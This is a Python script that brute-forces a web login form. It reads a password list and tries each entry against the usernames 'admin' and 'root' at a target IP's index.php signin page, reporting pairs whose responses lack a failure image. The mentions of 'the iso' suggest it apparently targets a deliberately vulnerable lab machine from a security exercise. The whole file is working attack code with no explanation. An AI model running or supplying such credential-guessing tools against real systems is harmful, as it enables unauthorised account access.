import requests
import argparse

if __name__ == '__main__':
    try:
        with open('./passlist.txt') as f:
            passwords = f.read().split('\n')

        parser = argparse.ArgumentParser()
        parser.add_argument("root_url",
                        help="Please provide the root_url of the site provided by the iso. In this format: 10.13.0.196",
                        type=str)
        args = parser.parse_args()
        url = 'http://{}/index.php'.format(args.root_url)
        for user in ['admin', 'root']:
            for password in passwords:
                params = {
                    'page': 'signin',
                    'username': user,
                    'password': password,
                    'Login': 'Login'
                }
                r = requests.get(url, params)
                if 'images/WrongAnswer.gif' not in r.text:
                    print(user, password)
    except requests.exceptions.ConnectionError as err:
        print("There was an issue with the url provided. Check if the iso is running and provide the root_url of the "
              "site provided by the iso. In this format: 10.13.0.196")
    except:
        print("An error occured.")
